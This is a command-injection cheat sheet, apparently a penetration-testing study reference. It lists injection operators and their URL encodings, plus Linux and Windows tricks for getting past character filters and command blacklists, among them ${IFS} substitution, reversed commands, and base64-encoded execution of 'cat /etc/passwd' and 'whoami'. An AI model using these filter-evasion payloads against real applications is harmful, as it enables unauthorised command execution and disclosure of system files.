# Command Injection

## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

---

# Linux

## Filtered Character Bypass

| Description                                                                        | Code                    |
| ---------------------------------------------------------------------------------- | ----------------------- |
| Can be used to view all environment variables                                      | `printenv`              |
|                                                                                    | **Spaces**              |
| Using tabs instead of spaces                                                       | `%09`                   |
| Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) | `${IFS}`                |
| Commas will be replaced with spaces                                                | `{ls,-la}`              |
|                                                                                    | **Other Characters**    |
| Will be replaced with `/`                                                          | `${PATH:0:1}`           |
| Will be replaced with `;`                                                          | `${LS_COLORS:10:1}`     |
| Shift character by one (`[` -> `\`)                                                | `$(tr '!-}' '"-~'<<<[)` |

---

## Blacklisted Command Bypass

| Description                         | Code                                                         |
| ----------------------------------- | ------------------------------------------------------------ |
|                                     | **Character Insertion**                                      |
| Total must be even                  | `'` or `"`                                                   |
| Linux only                          | `$@` or `\`                                                  |
|                                     | **Case Manipulation**                                        |
| Execute command regardless of cases | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           |
| Another variation of the technique  | `$(a="WhOaMi";printf %s "${a,,}")`                           |
|                                     | **Reversed Commands**                                        |
| Reverse a string                    | `echo 'whoami' \| rev`                                       |
| Execute reversed command            | `$(rev<<<'imaohw')`                                          |
|                                     | **Encoded Commands**                                         |
| Encode a string with base64         | `echo -n 'cat /etc/passwd \| grep 33' \| base64`             |
| Execute b64 encoded string          | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` |

---

# Windows

## Filtered Character Bypass

| Description                                                  | Code                    |
| ------------------------------------------------------------ | ----------------------- |
| Can be used to view all environment variables - (PowerShell) | `Get-ChildItem Env:`    |
|                                                              | **Spaces**              |
| Using tabs instead of spaces                                 | `%09`                   |
| Will be replaced with a space - (CMD)                        | `%PROGRAMFILES:~10,-5%` |
| Will be replaced with a space - (PowerShell)                 | `$env:PROGRAMFILES[10]` |
|                                                              | **Other Characters**    |
| Will be replaced with `\` - (CMD)                            | `%HOMEPATH:~0,-17%`     |
| Will be replaced with `\` - (PowerShell)                     | `$env:HOMEPATH[0]`      |

---

## Blacklisted Command Bypass

| Code                                                                                                         | Description                              |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| **Character Insertion**                                                                                      |                                          |
| `'` or `"`                                                                                                   | Total must be even                       |
| `^`                                                                                                          | Windows only (CMD)                       |
| **Case Manipulation**                                                                                        |                                          |
| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
| **Reversed Commands**                                                                                        |                                          |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
| **Encoded Commands**                                                                                         |                                          |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
